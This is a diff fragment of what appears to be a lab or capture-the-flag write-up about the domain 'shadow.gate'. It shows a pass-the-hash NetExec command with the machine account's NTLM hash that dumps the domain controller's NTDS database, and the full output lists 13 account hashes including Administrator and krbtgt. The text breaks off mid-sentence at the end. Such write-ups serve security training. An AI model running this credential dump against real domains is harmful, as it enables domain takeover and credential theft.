@@ -367,5 +367,26 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 Now i have the NTLM hash for the user, i can perform a DCSync
 
 ```python
-
+nxc smb dc01.shadow.gate -u 'dc01$' -H '57867e655d1abc9f45fd6e954e351531' --ntds     
+SMB         10.1.130.196    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
+SMB         10.1.130.196    445    DC01             [+] shadow.gate\dc01$:57867e655d1abc9f45fd6e954e351531 
+SMB         10.1.130.196    445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         10.1.130.196    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.1.130.196    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
+SMB         10.1.130.196    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.1.130.196    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e09802:::
+SMB         10.1.130.196    445    DC01             shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:3215f4c7c852647c88694ab0b57daaba:::
+SMB         10.1.130.196    445    DC01             shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:6f16868319543175e7f3e6d4eea9adfb:::
+SMB         10.1.130.196    445    DC01             shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
+SMB         10.1.130.196    445    DC01             shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:27e133a345b980d24e3a60f169f2cb7e:::
+SMB         10.1.130.196    445    DC01             shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:be0b6d125a6645747d91d30ed3bef98f:::
+SMB         10.1.130.196    445    DC01             shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:ff506444e2c59b0241812e8e17b0f05e:::
+SMB         10.1.130.196    445    DC01             shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:9290a555713c7db0cf7fbf0ac28c1100:::
+SMB         10.1.130.196    445    DC01             shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:f5c86043de2a116c6458f3de9aad89de:::
+SMB         10.1.130.196    445    DC01             shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:381480af4a988ad46758c2f79ee64090:::
+SMB         10.1.130.196    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531:::
+SMB         10.1.130.196    445    DC01             [+] Dumped 13 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.1.130.196_2026-05-10_193122.ntds of which 12 were added to the database
+SMB         10.1.130.196    445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.1.130.196    445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.1.130.196_2026-05-10_193122.ntds | cut -d ':' -f1
 ```
+I can now dump the contents of NTDS via nxc or secretsdump, in this case il
